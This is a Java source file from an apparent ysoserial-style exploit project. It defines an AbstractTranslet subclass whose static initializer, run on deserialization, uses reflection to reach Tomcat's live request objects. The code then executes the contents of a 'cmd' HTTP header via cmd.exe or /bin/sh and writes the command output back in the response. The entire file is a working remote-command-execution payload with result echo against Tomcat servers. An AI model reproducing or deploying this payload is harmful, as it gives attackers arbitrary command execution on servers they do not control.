package ysoserial;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
/*
tested on Tomcat:

 */


// 参考：https://github.com/feihong-cs/Java-Rce-Echo/blob/master/Tomcat/code/TomcatEcho-%E5%85%A8%E7%89%88%E6%9C%AC.jsp
public class MyClassLoader2_2 extends AbstractTranslet {
    static {
        try{

            boolean flag = false;
            ThreadGroup group = Thread.currentThread().getThreadGroup();
            java.lang.reflect.Field f = group.getClass().getDeclaredField("threads");
            f.setAccessible(true);
            Thread[] threads = (Thread[]) f.get(group);
            for(int i = 0; i < threads.length; i++) {
                try{
                    Thread t = threads[i];
                    if (t == null) continue;
                    String str = t.getName();
                    if (str.contains("exec") || !str.contains("http")) continue;
                    f = t.getClass().getDeclaredField("target");
                    f.setAccessible(true);
                    Object obj = f.get(t);
                    if (!(obj instanceof Runnable)) continue;
                    f = obj.getClass().getDeclaredField("this$0");
                    f.setAccessible(true);
                    obj = f.get(obj);
                    try{
                        f = obj.getClass().getDeclaredField("handler");
                    }catch (NoSuchFieldException e){
                        f = obj.getClass().getSuperclass().getSuperclass().getDeclaredField("handler");
                    }
                    f.setAccessible(true);
                    obj = f.get(obj);
                    try{
                        f = obj.getClass().getSuperclass().getDeclaredField("global");
                    }catch(NoSuchFieldException e){
                        f = obj.getClass().getDeclaredField("global");
                    }
                    f.setAccessible(true);
                    obj = f.get(obj);
                    f = obj.getClass().getDeclaredField("processors");
                    f.setAccessible(true);
                    java.util.List processors = (java.util.List)(f.get(obj));

                    org.apache.coyote.Request req = null;
                    org.apache.coyote.Response resp = null;
                    for(int j = 0; j < processors.size(); ++j) {
                        Object processor = processors.get(j);
                        f = processor.getClass().getDeclaredField("req");
                        f.setAccessible(true);
                        req = (org.apache.coyote.Request)f.get(processor);
                        resp = (org.apache.coyote.Response)req.getClass().getMethod("getResponse", new Class[0]).invoke(req, new Object[0]);
                        str = req.getHeader("cmd");
                        String str2 = req.getHeader("Testecho");
                        if (str2!= null && !str.isEmpty()){
                            // 回显Testecho头，别500了不好看
                            resp.setStatus(200);
                            resp.addHeader("Testecho", str2);
                        }

                        if (str != null && !str.isEmpty()) {
                            resp.getClass().getMethod("setStatus", new Class[]{int.class}).invoke(resp, new Object[]{new Integer(200)});
                            String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", str} : new String[]{"/bin/sh", "-c", str};
                            byte[] result = (new java.util.Scanner((new ProcessBuilder(cmds)).start().getInputStream())).useDelimiter("\\A").next().getBytes();
                            try {
                                org.apache.tomcat.util.buf.ByteChunk byteChunk = new org.apache.tomcat.util.buf.ByteChunk();
                                byteChunk.setBytes(result, 0, result.length);
                                resp.doWrite(byteChunk);
                            } catch (Exception var5) {
                                resp.doWrite(java.nio.ByteBuffer.wrap(result));

                            }
                            flag = true;
                        }
                        if (flag) break;
                    }
                    if (flag)  break;
                }catch(Exception e){
                    continue;
                }
            }



        }catch(Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}

